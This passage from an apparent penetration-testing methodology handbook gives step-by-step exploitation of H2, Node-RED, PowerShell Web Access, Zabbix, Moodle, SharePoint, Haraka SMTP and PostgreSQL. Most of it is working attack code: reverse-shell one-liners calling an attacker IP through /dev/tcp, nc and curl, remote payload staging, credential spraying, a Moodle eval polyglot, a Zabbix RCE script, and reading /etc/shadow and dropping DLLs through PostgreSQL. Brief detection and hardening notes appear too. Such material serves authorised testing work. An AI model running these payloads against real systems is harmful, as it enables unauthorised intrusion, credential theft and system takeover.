#   jdbc:h2:tcp://127.0.0.1:9092/~/<INTERNAL_DB>
```

### Exploitation — CREATE ALIAS -> Runtime.exec

```text
-- Define a SQL alias backed by inline Java; H2 compiles it on the fly
CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
  java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter("\\A");
  return s.hasNext() ? s.next() : "";
} $$;

-- Confirm execution context
CALL SHELLEXEC('id');
CALL SHELLEXEC('whoami');
CALL SHELLEXEC('hostname');
```

### Reverse Shell

```text
-- Brace-expansion avoids quoting issues through the JDBC layer
CALL SHELLEXEC('bash -c {echo,<BASE64_PAYLOAD>}|{base64,-d}|{bash,-i}');
-- <BASE64_PAYLOAD> = base64 of: bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1

-- Or stage a Python callback
CALL SHELLEXEC('curl -s http://<ATTACKER_IP>/r.py -o /tmp/r.py');
CALL SHELLEXEC('python3 /tmp/r.py');
```

### Exploitation — INIT=RUNSCRIPT (Sandbox-Restricted Targets)

```text
# When CREATE ALIAS is filtered, embed SQL in the JDBC URL itself.
# RUNSCRIPT executes before the console evaluates its allowlist.
JDBC URL: jdbc:h2:mem:<INTERNAL_DB>;INIT=RUNSCRIPT FROM 'http://<ATTACKER_IP>/init.sql'
```

```bash
# Host the SQL payload on attacker
cat > init.sql <<'SQL'
CREATE ALIAS SHELLEXEC AS $$ String x(String c) throws Exception {
  java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(c).getInputStream()).useDelimiter("\\A");
  return s.hasNext() ? s.next() : "";
} $$;
CALL SHELLEXEC('id');
SQL
python3 -m http.server 80
```

### Exploitation — JNDI Variant (CVE-2021-42392 / CVE-2022-23221)

```bash
# Unauth RCE on console <= 2.0.204 via JNDI lookup in JDBC URL parameters
msf6 > use exploit/multi/http/h2_jndi_rce
msf6 > set RHOSTS <TARGET>
msf6 > set RPORT 8082
msf6 > set LHOST <ATTACKER_IP>
msf6 > set LPORT <ATTACKER_PORT>
msf6 > run
```

### Automated Exploits

```bash
# https://github.com/mthbernardes/H2-RCE
git clone https://github.com/mthbernardes/H2-RCE
python3 H2-RCE/H2-RCE.py -H 127.0.0.1:8082 -d 'jdbc:h2:~/<INTERNAL_DB>'

# searchsploit
searchsploit h2 1.4
searchsploit -m java/webapps/45506.py
python3 45506.py -H 127.0.0.1:8082 -d 'jdbc:h2:~/<INTERNAL_DB>'
```

### Common CVEs

```text
| CVE             | Affected         | Notes                                         |
|-----------------|------------------|-----------------------------------------------|
| CVE-2018-10054  | H2 <= 1.4.197    | Console arbitrary code via CREATE ALIAS       |
| CVE-2021-23463  | H2 <= 2.0.202    | XXE in JdbcSQLXML                             |
| CVE-2021-42392  | H2 <= 2.0.204    | Unauth JNDI RCE on console                    |
| CVE-2022-23221  | H2 <= 2.1.210    | Console JDBC URL JNDI RCE                     |
```

### Post-Exploit / Detection / Hardening

```bash
# Persisted aliases (artifacts from prior operators)
# SQL: SELECT * FROM INFORMATION_SCHEMA.FUNCTION_ALIASES;

# Detection cues
#   - h2 process with -webAllowOthers / -tcpAllowOthers flags
#   - new entries in INFORMATION_SCHEMA.FUNCTION_ALIASES
#   - Java process spawning bash/sh/cmd children (parent = org.h2.tools.*)
#   - Outbound LDAP/RMI from JVM hosting H2 (JNDI variants)

# Hardening
#   - Console on 127.0.0.1 only (default); no -webAllowOthers
#   - Set sa password; disable mixed mode; remove h2-console.jar from prod
#   - Upgrade to >= 2.1.210
```

---

## Phase 14m: Node-RED (port 1880)

Default no-auth flow editor exposes `/red/flows` POST; an `exec` node runs OS commands as the Node-RED user.

### Enumeration

```bash
curl -s http://<TARGET>:1880/settings | jq .
curl -s http://<TARGET>:1880/red/flows
nmap -sV -p 1880 --script=http-title <TARGET>
```

### Default Credentials

```bash
# admin:password / admin:admin / admin:nodered
curl -s -X POST http://<TARGET>:1880/auth/token \
  -d 'client_id=node-red-editor&grant_type=password&scope=*&username=admin&password=password'
```

### Exploitation — Flow Import RCE

```bash
cat > flow.json <<'JEOF'
[{"id":"a1","type":"tab","label":"pwn"},
 {"id":"b1","type":"inject","z":"a1","props":[{"p":"payload"}],"once":true,"onceDelay":0.1,"payload":"","payloadType":"date","wires":[["c1"]]},
 {"id":"c1","type":"exec","z":"a1","command":"bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1'","addpay":false,"useSpawn":"false","wires":[[],[],[]]}]
JEOF

nc -lvnp <ATTACKER_PORT>

curl -s -X POST http://<TARGET>:1880/red/flows \
  -H 'Content-Type: application/json' \
  -H 'Node-RED-Deployment-Type: full' \
  --data @flow.json
```

### Exploitation — TCP-In/Exec/TCP-Out Channel

```bash
# Build via UI: tcp in (Connect to <ATTACKER_IP>:<ATTACKER_PORT>) -> exec (Append msg.payload) -> tcp out
nc -lvnp <ATTACKER_PORT>
```

### Exploitation — function Node Sandbox Escape

```javascript
var p = global.get('process') || this.constructor.constructor('return process')();
var cp = p.mainModule.require('child_process');
msg.payload = cp.execSync('id;cat /etc/passwd').toString();
return msg;
```

### Common CVEs

```text
CVE-2021-3223  — node-red-dashboard path traversal
CVE-2023-32316 — editor-api path traversal
CVE-2024-21501 — function node sandbox escape
```

### Post-Exploit

```bash
find / -name 'flows*.json' 2>/dev/null
cat ~/.node-red/flows_$(hostname).json | jq '.[] | select(.credentials)'
cat ~/.node-red/settings.js | grep -E 'credentialSecret|adminAuth'
ps -ef | grep -E 'node-red|node '
```

> **Tip:** Same family as Jenkins / Rundeck / n8n / Airflow — low-code + weak auth = RCE-by-design.

> **OPSEC:** exec node child of `node` process; flows persist in `flows_<hostname>.json`.

---

## Phase 14n: PowerShell Web Access (PSWA)

PSWA is a Windows Server role (Server 2012+) that exposes PowerShell Remoting through an IIS-hosted browser portal — typically `/pswa` or `/Remote/default.aspx` on 443. Successful login drops the operator into a browser-based PSSession that runs under **ConstrainedLanguage Mode + AppLocker** by default. Treat it as a credential-spray surface that yields a (constrained) shell on the AD-joined gateway host.

### 14n.1 Enumeration

```bash
# Fingerprint the PSWA endpoint on IIS targets
curl -sk -I https://<TARGET>/pswa
curl -sk -I https://<TARGET>/Remote/default.aspx
curl -sk https://<TARGET>/Remote/default.aspx | grep -iE 'PowerShell Web Access|PowerShellWebAccess|userName|userPassword'
```

```bash
# SSL cert frequently leaks the install — default cert CN = PowerShellWebAccessTestWebSite
openssl s_client -connect <TARGET>:443 -servername <TARGET> </dev/null 2>/dev/null \
  | openssl x509 -noout -subject -issuer
```

```bash
# Common path probe
for p in /pswa /Remote /Remote/default.aspx /pswa/default.aspx; do
  echo "== $p =="; curl -sk -o /dev/null -w '%{http_code}\n' "https://<TARGET>$p"
done
```

> **Tip:** PSWA requires the gateway host to have an explicit authorization rule (`Add-PswaAuthorizationRule`) per user/computer/configuration. Even valid AD creds fail without a matching rule — a `200` with the form re-rendered (no session cookie issued) usually means "auth OK, no rule".

### 14n.2 Login Form Reference

```text
# POST target: https://<TARGET>/Remote/default.aspx
# Form fields:
#   userName        : .\<USER>          (local logon)   OR   <DOMAIN>\<USER>   (domain logon)
#   userPassword    : <PASSWORD>
#   ComputerName    : <TARGET> or <DOMAIN_FQDN>          (the box to PSSession into)
#   ConnectionType  : 0 = Computer Name (local) | 1 = ConnectionUri
#   ConnectionUri   : https://<REMOTE_HOST>:5986/wsman   (only when ConnectionType=1)
#   __VIEWSTATE / __EVENTVALIDATION : harvest from GET, replay on POST
```

### 14n.3 Credential Spray

```bash
# Low-and-slow spray — AD lockout policy applies to both local and domain logons
# Harvest the baseline failed-login response length first, then -fs that length
ffuf -X POST -u https://<TARGET>/Remote/default.aspx \
  -d 'userName=.\\FUZZ&userPassword=<PASSWORD>&ComputerName=<TARGET>&ConnectionType=0' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -w users.txt -mc 200 -fs <BASELINE_LENGTH> -k -p 2.0
```

```bash
# Domain spray — one password across many users (avoid per-user lockout)
ffuf -X POST -u https://<TARGET>/Remote/default.aspx \
  -d 'userName=<DOMAIN>\\FUZZ&userPassword=<PASSWORD>&ComputerName=<DOMAIN_FQDN>&ConnectionType=0' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -w users.txt -mc 200 -fs <BASELINE_LENGTH> -k -p 2.0
```

#### Living-off-the-land alternative — Burp Intruder

```text
# When ffuf is unavailable: send the login POST through Burp, mark userName as the
# payload position, load a username list, sort by Length to spot the success outlier.
# Watch for Set-Cookie: SessionId= on success.
```

### 14n.4 Post-Login — Constrained Shell

The browser PSSession runs under ConstrainedLanguage + AppLocker. Expect:

```text
# What works                       # What is blocked
- cmdlet calls (Get-*, Set-*)      - New-Object .NET types (Net.WebClient, IO.File)
- pipeline operators               - Add-Type / inline C#
- string ops, arithmetic           - [ScriptBlock]::Create() with method invocation
- whitelisted modules              - Direct .NET reflection
- approved binaries (LOLBINs)      - PowerShell v2 engine, WMI/wmic, most COM objects
```

```powershell
# Confirm the constraint mode immediately on landing
$ExecutionContext.SessionState.LanguageMode
# Expected: ConstrainedLanguage

# Identify the gateway host and current principal
hostname; whoami /all
$PSVersionTable
Get-ExecutionPolicy -List
```

> **Escape playbook:** see `windows-methodology.md` §4.11 (AppLocker / CLM bypass) and `file-transfers.md` ConstrainedLanguage section for native LOLBIN downloaders, `Runspace`-based language-mode bypasses, and AppLocker policy enumeration.

### 14n.5 Common CVEs / Misconfigs

```text
# CVE-2018-8273  : PSWA XSS via crafted ComputerName parameter (auth-required)
# Misconfig      : PswaAuthorizationRule with ConfigurationName=* and UserName=*  → any
#                  authenticated user gets a full-language session on the gateway
# Misconfig      : PSWA installed on a DC — successful login = code execution on DC
#                  in the context of the logon user (DA/EA spray jackpot)
```

```powershell
# After login, enumerate the rule set if the session permits
Get-PswaAuthorizationRule
# Look for wildcard ConfigurationName (* or Microsoft.PowerShell) which lifts CLM
```

### 14n.6 Post-Exploit

```powershell
# AD recon under CLM — Get-ADUser/Group via the ActiveDirectory module is whitelisted
# on most gateway installs (the module is signed)
Get-ADUser -Filter * -Properties memberOf | Select SamAccountName,memberOf
Get-ADGroupMember "Domain Admins"

# Pivot — if the rule allows ConfigurationName=*, request a full-language session
Enter-PSSession -ComputerName <INTERNAL_TARGET> -ConfigurationName Microsoft.PowerShell
$ExecutionContext.SessionState.LanguageMode  # FullLanguage on the pivot host
```

> **OPSEC:** PSWA logon attempts log to `Microsoft-Windows-PowerShell-WebAccess/Operational` (event 4-7) and the standard Security log (4624 type 3 / 4625). Account lockouts trigger normally for both local and domain accounts. Treat PSWA creds as lab-locker fuel, not stealth — the IIS access log on the gateway captures every POST with timestamp and source IP.

---

## Phase 14o: Zabbix — Frontend (JSON-RPC API) + Agent (10050) RCE

### Enumeration

```bash
# Identify Zabbix
curl -sk http://<TARGET>/zabbix/ | grep -iE 'zabbix|version'
curl -sk -X POST -H 'Content-Type: application/json-rpc' \
  http://<TARGET>/zabbix/api_jsonrpc.php \
  -d '{"jsonrpc":"2.0","method":"apiinfo.version","params":[],"id":1}'
# Returned version → searchsploit zabbix / NVD
```

### Default Credentials

```text
Admin:zabbix
guest:<empty>            # "sign in as guest" link on login page often enabled
```

### Guest Read-Only Enumeration

```text
# Click "sign in as guest" on the login page → read-only console
# Note hosts, items, users, agent versions visible to guest
# Pivot: usernames seen here become brute-force targets
```

### Online Brute Force — Frontend Login

```bash
patator http_fuzz url=http://<TARGET>/zabbix/index.php method=POST \
  body='name=<USERNAME>&password=FILE0&autologin=1&enter=Sign+in' \
  0=/usr/share/seclists/Passwords/darkweb2017-top1000.txt \
  accept_cookie=1 follow=1 \
  -x ignore:fgrep='Login name or password is incorrect.'

# Tip: prepend the username to the wordlist (service accounts often have user==pass)
( echo '<USERNAME>'; cat /usr/share/seclists/Passwords/darkweb2017-top1000.txt ) > wl.txt
```

### JSON-RPC API Auth + Host Enumeration

```bash
# Get auth token
curl -sk -X POST -H 'Content-Type: application/json' \
  http://<TARGET>/zabbix/api_jsonrpc.php \
  -d '{"jsonrpc":"2.0","method":"user.login","params":{"user":"<USERNAME>","password":"<PASSWORD>"},"auth":null,"id":0}'
# → result is the auth token (hex string)

# Enumerate hosts + interfaces (need hostid for script.execute)
curl -sk -X POST -H 'Content-Type: application/json' \
  http://<TARGET>/zabbix/api_jsonrpc.php \
  -d '{"jsonrpc":"2.0","method":"host.get","params":{"output":["hostid","host"],"selectInterfaces":["interfaceid","ip"]},"auth":"<TOKEN>","id":0}'
```

> **Tip:** A Zabbix user with "GUI access disabled" can still authenticate to `api_jsonrpc.php`. Don't drop creds because the web login rejects them — try the API directly.

### API RCE — Zabbix 2.2 to 3.0.3 (script.update + script.execute)

```python
# https://www.exploit-db.com/exploits/39937 — Zabbix RCE via JSON-RPC API
import requests, json

ROOT = 'http://<TARGET>/zabbix'
LOGIN, PASSWORD = '<USERNAME>', '<PASSWORD>'
HOSTID = '<HOSTID>'              # from host.get above
HEAD = {'Content-Type': 'application/json'}

auth = requests.post(ROOT + '/api_jsonrpc.php', headers=HEAD,
    data=json.dumps({"jsonrpc":"2.0","method":"user.login",
        "params":{"user":LOGIN,"password":PASSWORD},"auth":None,"id":0})
).json()['result']

def run(cmd):
    requests.post(ROOT + '/api_jsonrpc.php', headers=HEAD,
        data=json.dumps({"jsonrpc":"2.0","method":"script.update",
            "params":{"scriptid":"1","command":cmd},"auth":auth,"id":0}))
    r = requests.post(ROOT + '/api_jsonrpc.php', headers=HEAD,
        data=json.dumps({"jsonrpc":"2.0","method":"script.execute",
            "params":{"scriptid":"1","hostid":HOSTID},"auth":auth,"id":0})).json()
    print(r.get('result',{}).get('value', r))

run('id')
run('uname -a; cat /etc/os-release')
# Catch a reverse shell — Perl one-liner survives where bash -i may not
run('perl -e \'use Socket;$i="<ATTACKER_IP>";$p=<ATTACKER_PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\' &')
```

### Unauthenticated Zabbix Agent — system.run on 10050/tcp

```bash
# Detect: anything on 10050 is almost always zabbix-agent (IANA assigned)
nc -nv <TARGET> 10050           # connection open = agent listening
# Vulnerable when zabbix_agentd.conf has:
#   EnableRemoteCommands=1
# (default-on in some 3.x packagings; trivially exploitable when reachable)

# Probe the agent — basic info keys
echo 'agent.hostname'   | nc <TARGET> 10050
echo 'agent.version'    | nc <TARGET> 10050
echo 'system.uname'     | nc <TARGET> 10050

# Execute arbitrary command (no auth) — system.run[<cmd>]
echo 'system.run[ id ]'              | nc <TARGET> 10050
echo 'system.run[ cat /etc/passwd ]' | nc <TARGET> 10050
echo 'system.run[ ls -la / ]'        | nc <TARGET> 10050
```

### Bypass Agent 3-Second Command Timeout — Chained Reverse Shell

```bash
# Problem: system.run[] kills the child after ~3s — direct reverse shell dies on arrival.
# Solution: stage-1 listener feeds a keep-alive command into stage-2 listener.

# 1) Drop a Perl reverse shell payload into a writable path (e.g. shared volume)
cat > /<WRITABLE_PATH>/shell.pl <<'EOF'
use Socket;$i="<ATTACKER_IP>";$p=<ATTACKER_PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};
EOF

# 2) Stage-1 listener: replies with the launch command, then disconnects
printf 'perl /<WRITABLE_PATH>/shell.pl\n' | nc -lvp <ATTACKER_PORT>

# 3) Stage-2 listener: catches the actual long-lived shell
nc -lvnp <ATTACKER_PORT>

# 4) Trigger via system.run — pipe stage-1 output into a local shell on the target.
#    The mkfifo trick survives the 3-second timeout because the connection is
#    backgrounded and the spawned shell detaches.
echo 'system.run[ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> <ATTACKER_PORT> >/tmp/f & ]' | nc <TARGET> 10050
```

> **OPSEC:** Zabbix Agent logs every `system.run` invocation to `/var/log/zabbix/zabbix_agentd.log` with the full command. Defenders looking for unauthenticated 10050 abuse will find it instantly.

### Pivot — Zabbix Server (Container) → Host via Shared Mount

```bash
# When the Zabbix server runs in Docker on the target, the Agent often runs on the host
# and reaches the container via the docker0 gateway (172.17.0.1).
cat /.dockerenv >/dev/null 2>&1 && echo '[+] in container'
ip route                              # default gateway = host (e.g. 172.17.0.1)
ls -la /                              # look for host-shared dirs (/backups, /data, /mnt)
findmnt -t fuse,bind 2>/dev/null      # shared bind mounts

# Drop reverse-shell payload into the shared mount, then execute via host's Zabbix Agent
# on 10050 — the file written from the container is visible to the host.
```

### Common CVEs

| CVE | Affected | Notes |
|-----|----------|-------|
| EDB-39937 | 2.2 – 3.0.3 | API JSON-RPC RCE (script.update + script.execute) |
| CVE-2017-2825 | Agent < 3.0.9 | LDAP injection (auth bypass) |
| CVE-2020-11800 | Server | Trapper RCE |
| CVE-2022-23131 | Server | SAML SSO session forgery → admin |
| CVE-2022-23134 | Server | setup.php auth bypass (post-install) |
| CVE-2024-22116 | < 6.0.27 / < 6.4.12 | RCE via Ping script (admin) |
| CVE-2024-36461 | Server | API SQLi (admin) |

```bash
searchsploit zabbix
```

---

## Phase 14p: Moodle

### 14p.1 Fingerprint

```bash
# Version disclosure
curl -s http://<TARGET>/<APP_PATH>/lib/upgrade.txt | head -5
curl -s http://<TARGET>/<APP_PATH>/composer.json | grep -i version
curl -s http://<TARGET>/<APP_PATH>/admin/environment.xml | grep -i version

# Login surface
curl -s -o /dev/null -w '%{http_code}\n' http://<TARGET>/<APP_PATH>/login/index.php
```

### 14p.2 CVE-2018-1133 — Evil Teacher (auth RCE via calculated quiz formula)

Vulnerable: Moodle < 3.5.0 / 3.4.3 / 3.3.6 / 3.1.12. Requires teacher-role account.
Root cause: `question/type/calculated/questiontype.php::substitute_variables_and_eval()` calls `eval('$str = '.$formula.';')` on attacker-controlled formula text after weak `qtype_calculated_find_formula_errors()` sanitization — formula syntax permits embedded PHP via polyglot.

```text
# 1. Login as teacher
#    Course → Add an activity or resource → Quiz → Save → Edit quiz → Add → a new question → Calculated
# 2. In Answer 1 formula= field, paste polyglot:
/*{a*/`$_GET[0]`;//{x}}
# 3. Save question. Capture cmid (course-module id) and id (question id) from URL.
# 4. Trigger eval() via dataset-items wizard with cmd in querystring param 0.
```

```bash
# Build URL-encoded reverse-shell payload
CMD='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER_IP> <ATTACKER_PORT> >/tmp/f'
PAYLOAD=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$CMD")

# Authenticated trigger — replace <CMID>/<QUESTION_ID> with values from the saved question
curl -sk -b 'MoodleSession=<TOKEN>' \
  "http://<TARGET>/<APP_PATH>/question/question.php?returnurl=%2Fmod%2Fquiz%2Fedit.php%3Fcmid%3D<CMID>%26addonpage%3D0&appendqnumstring=addquestion&scrollpos=0&id=<QUESTION_ID>&wizardnow=datasetitems&cmid=<CMID>&0=${PAYLOAD}"
```

```bash
# Catcher — RCE returns as web user (typically www-data)
nc -lvnp <ATTACKER_PORT>
```

### 14p.3 Post-exploit — config.php + mdl_user looting

```bash
# DB creds in Moodle config.php
cat /var/www/html/<APP_PATH>/config.php | grep -E 'dbhost|dbname|dbuser|dbpass'

# Dump users (mdl_ table prefix is default)
mysql -u <USER> -p'<PASSWORD>' <INTERNAL_DB> -e \
  "SELECT id,username,password,email FROM mdl_user;"
```

```text
# Hash format clues in mdl_user.password column:
#   32-hex                    → raw MD5      (hashcat -m 0)   — pre-3.x
#   $2y$10$...                → bcrypt       (hashcat -m 3200) — modern
#   $S$...                    → Drupal sha512 (hashcat -m 7900)
```

> **Tip:** Look for backup-style usernames in `mdl_user` (e.g. `<USER>bak`, `<USER>_old`, `<USER>.bak`) — they often retain weaker hashes than the active account because they predate password-policy upgrades.

---

## Phase 14q: Microsoft SharePoint — Pre-Auth Enumeration

SharePoint is an IIS-hosted collaboration/content platform reachable on 80/443. Pre-auth surface includes version fingerprinting via headers and well-known paths, anonymous-readable site/list endpoints, and legacy SOAP/RPC handlers that often answer without credentials. Treat the fingerprint as a precursor to CVE selection (e.g., CVE-2019-0604 ViewState, CVE-2023-29357 SPNEGO auth bypass, CVE-2024-38094 ToolPane, ToolShell CVE-2025-53770/53771).

### 14q.1 Fingerprint

```bash
# Server / SharePoint version headers — MicrosoftSharePointTeamServices reveals build
curl -sk -I https://<TARGET>/ | grep -iE 'Server|MicrosoftSharePointTeamServices|SPRequestGuid|SharePointHealthScore|X-Powered-By|X-AspNet-Version'
curl -sk -I https://<TARGET>/_layouts/15/start.aspx | grep -iE 'MicrosoftSharePointTeamServices|SPRequestGuid'
```

```bash
# Version probe paths — 15/ = SharePoint 2013/2016/2019/SE, 14/ = 2010, 12/ = 2007
for p in /_layouts/15/start.aspx /_layouts/14/start.aspx /_layouts/12/start.aspx /_vti_pvt/service.cnf /_vti_inf.html; do
  echo "== $p =="; curl -sk -o /dev/null -w '%{http_code}\n' "https://<TARGET>$p"
done
```

```bash
# /_vti_inf.html exposes FrontPage/SharePoint extensions metadata when present
curl -sk https://<TARGET>/_vti_inf.html
```

> **Tip:** `MicrosoftSharePointTeamServices: 16.0.0.<build>` maps to a specific cumulative update — cross-reference the build number against the public SharePoint patch matrix to pick applicable CVEs before touching exploit paths.

### 14q.2 Anonymous Content / Site Discovery

```bash
# REST endpoints that frequently answer anonymously on misconfigured webs
curl -sk "https://<TARGET>/_api/web" -H 'Accept: application/json;odata=verbose'
curl -sk "https://<TARGET>/_api/web/lists" -H 'Accept: application/json;odata=verbose'
curl -sk "https://<TARGET>/_api/web/sitegroups" -H 'Accept: application/json;odata=verbose'
curl -sk "https://<TARGET>/_api/web/siteusers" -H 'Accept: application/json;odata=verbose'
```

```bash
# Classic site collection / web app discovery
for p in /sites/ /personal/ /my/ /SitePages/Home.aspx /Pages/default.aspx /_catalogs/masterpage /_layouts/15/viewlsts.aspx /_layouts/15/people.aspx; do
  echo "== $p =="; curl -sk -o /dev/null -w '%{http_code}\n' "https://<TARGET>$p"
done
```

```bash
# Enumerate site collections via Search (when anonymous search is enabled)
curl -sk "https://<TARGET>/_api/search/query?querytext='contentclass:STS_Site'" \
  -H 'Accept: application/json;odata=verbose'
```

### 14q.3 Shared Resources & Document Surfaces

```bash
# Common document/library paths — Shared Documents is the default, often readable
for p in '/Shared%20Documents/Forms/AllItems.aspx' '/Documents/Forms/AllItems.aspx' '/SiteAssets/Forms/AllItems.aspx' '/Style%20Library/Forms/AllItems.aspx' '/_catalogs/wp/Forms/AllItems.aspx'; do
  echo "== $p =="; curl -sk -o /dev/null -w '%{http_code}\n' "https://<TARGET>$p"
done
```

```bash
# WebDAV / PROPFIND against document libraries — often answers anonymously
curl -sk -X PROPFIND "https://<TARGET>/Shared%20Documents/" \
  -H 'Depth: 1' -H 'Content-Type: application/xml'
```

### 14q.4 Legacy SOAP / RPC Handlers

```bash
# Legacy ASMX web services — frequently anonymous, leak users/groups/site metadata
for svc in Lists Webs Users Permissions SiteData People Search Authentication; do
  echo "== $svc =="
  curl -sk -o /dev/null -w '%{http_code}\n' "https://<TARGET>/_vti_bin/${svc}.asmx"
  curl -sk "https://<TARGET>/_vti_bin/${svc}.asmx?WSDL" | head -20
done
```

```bash
# GetUserCollectionFromSite — pre-auth user dump on legacy/misconfigured deployments
curl -sk -X POST "https://<TARGET>/_vti_bin/UserGroup.asmx" \
  -H 'Content-Type: text/xml; charset=utf-8' \
  -H 'SOAPAction: "http://schemas.microsoft.com/sharepoint/soap/directory/GetUserCollectionFromSite"' \
  --data-binary @- <<'EOF'
<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUserCollectionFromSite xmlns="http://schemas.microsoft.com/sharepoint/soap/directory/"/>
  </soap:Body>
</soap:Envelope>
EOF
```

---

## Phase 14r: Haraka SMTP — Attachment Plugin RCE (CVE-2016-1000282)

Haraka < 2.8.9 with the `attachment` plugin enabled passes archive entry filenames into a shell, allowing command injection through a crafted attachment. RCE runs as the user owning the Haraka process.

### 14r.1 Identification

Banner-grab SMTP and confirm the Haraka version.

```bash
nmap -sV -p25,465,587 <TARGET>
nc -nv <TARGET> 25
# 220 <hostname> ESMTP Haraka/2.8.8 ready
```

```bash
# EHLO probe — Haraka responds with its name and version in the banner.
swaks --server <TARGET> --port 25 --ehlo attacker --quit-after FIRST-EHLO
```

> **Tip:** Any Haraka version banner < 2.8.9 with the attachment plugin enabled is exploitable.

### 14r.2 Exploit — Metasploit

```bash
msfconsole -q -x "use exploit/linux/smtp/haraka; \
set RHOSTS <TARGET>; \
set RPORT 25; \
set email_to <USER>@<DOMAIN>; \
set SRVHOST <ATTACKER_IP>; \
set LHOST <ATTACKER_IP>; \
set LPORT <ATTACKER_PORT>; \
set payload linux/x64/meterpreter/reverse_tcp; \
run"
```

### 14r.3 Exploit — Manual (crafted attachment)

```bash
# Build a tar with a filename that breaks out of the shell argument.
mkdir /tmp/haraka-payload && cd /tmp/haraka-payload
touch '`bash -i >& /dev/tcp/<ATTACKER_IP>/<ATTACKER_PORT> 0>&1`.zip'
tar -cf payload.tar *
```

```bash
# Listener for the reverse shell.
nc -lvnp <ATTACKER_PORT>
```

```bash
# Send the crafted attachment via swaks.
swaks --server <TARGET> --port 25 \
  --from attacker@<DOMAIN> \
  --to <USER>@<DOMAIN> \
  --header "Subject: test" \
  --body "test" \
  --attach @/tmp/haraka-payload/payload.tar
```

### 14r.4 Post-Exploitation Marker

```bash
# Confirm execution context inside the reverse shell.
id
hostname
ls -la "$HOME"
echo "marker-<USERNAME>-haraka-$(date +%s)" > "$HOME/marker-<USERNAME>-haraka.txt"
```

### 14r.5 Detection / Remediation Notes

```text
- Upgrade Haraka to >= 2.8.9.
- Disable the `attachment` plugin if not required.
- Detection: SMTP MAIL/DATA stages with attachment filenames containing backticks,
  $(...), shell metacharacters, or unusually long base64-decoded names.
```

---

## Phase 14s: PostgreSQL — Post-Auth File R/W & RCE Primitives

PostgreSQL post-authentication abuse via the Large Object (LO) API. `lo_import` + `lo_get` gives arbitrary file read as the postgres process user; `lo_export` (DBA-only) gives arbitrary file write — the RCE primitive when paired with an auto-loaded location and a coercion. Works on every PG version with `lo_*` functions (8.x+); PG >= 11 also exposes `pg_read_binary_file` as a one-shot read alternative.

### Recap — Auth Surface (See enumeration-methodology.md §3.22)

Service identification, default creds (`postgres:postgres`, `postgres:<blank>`), `\l` / `\dt` / `\du` enumeration, `pg_read_file`, `COPY ... FROM PROGRAM` superuser RCE, `pgsql-brute`, and Hydra spraying are covered in [enumeration-methodology.md §3.22](enumeration-methodology.md). This phase picks up after a working `psql` session with superuser / DBA privileges.

### Auth File Read — `lo_import` + `lo_get`

Two-stage primitive: `lo_import` reads a file off the PG host's filesystem into a Large Object and returns its OID; `lo_get(<OID>)` then dumps the bytes back over the SQL channel. Reads run as the postgres process user, so anything that user can read on disk is fair game.

```bash
# Stage 1 — import file into a large object, returns OID
psql -h <TARGET> -U postgres -d <INTERNAL_DB> -c "SELECT lo_import('/etc/passwd');"           # Linux
psql -h <TARGET> -U postgres -d <INTERNAL_DB> -c "SELECT lo_import('C:/Windows/win.ini');"    # Windows (forward slashes)

# Stage 2 — read the LO contents by OID (PG >= 9.4)
psql -h <TARGET> -U postgres -d <INTERNAL_DB> -c "SELECT lo_get(<OID>);"
```

```bash
# PG >= 11 cleaner one-shot alternative (no LO staging needed, no OID bookkeeping)
psql -h <TARGET> -U postgres -d <INTERNAL_DB> -c "SELECT pg_read_binary_file('/etc/shadow');"
psql -h <TARGET> -U postgres -d <INTERNAL_DB> -c "SELECT pg_read_binary_file('C:/Windows/System32/drivers/etc/hosts');"
```

> **Tip:** On Windows targets, `lo_import` requires forward-slashes in the path (`C:/Windows/...`). Backslashes get parsed as SQL escapes and the call fails silently.

### DBA RCE — `lo_export` Arbitrary Write

Stage attacker-controlled bytes into a Large Object via `lo_import`, then `lo_export` to a SYSTEM-writable + auto-loaded location. `lo_export` is DBA-only by default but the `postgres` superuser always has it.

```bash
# Stage A — stage payload bytes into a LO via lo_import (reads attacker-uploaded file from PG host's FS)
psql -h <TARGET> -U postgres -d <INTERNAL_DB> -c 'CREATE TABLE pwn("content" oid);'
psql -h <TARGET> -U postgres -d <INTERNAL_DB> -c "INSERT INTO pwn(content) VALUES (lo_import('<APP_PATH>'));"
```

```bash
# Stage B — Windows DLL drop into System32 for SYSTEM side-loading
# 'sysnative' from a 32-bit psql client bypasses WoW64 file-system redirection
# Drop a DLL with a name an existing service / scheduled task auto-loads (DLL hijack candidate)
psql -h <TARGET> -U postgres -d <INTERNAL_DB> -c \
  "SELECT lo_export(content, 'C:/windows/sysnative/<APP_PATH>.dll') FROM pwn;"
```

```bash
# Stage B — Linux setuid binary drop or cron'd-script overwrite
# /var/lib/postgresql is owned by postgres and is a natural staging dir
psql -h <TARGET> -U postgres -d <INTERNAL_DB> -c \
  "SELECT lo_export(content, '/var/lib/postgresql/<APP_PATH>') FROM pwn;"

# Or drop into a cron-readable location that postgres can write to (engagement-specific)
psql -h <TARGET> -U postgres -d <INTERNAL_DB> -c \
  "SELECT lo_export(content, '<APP_PATH>') FROM pwn;"
```

### Non-Superuser File Write — `pg_write_server_files` Role

PostgreSQL 11+ introduced predefined roles. A user granted `pg_write_server_files` can use `COPY ... TO` for arbitrary file write without needing superuser. This is weaker than `lo_export` (which is DBA-only) but often granted to application accounts that manage data exports.

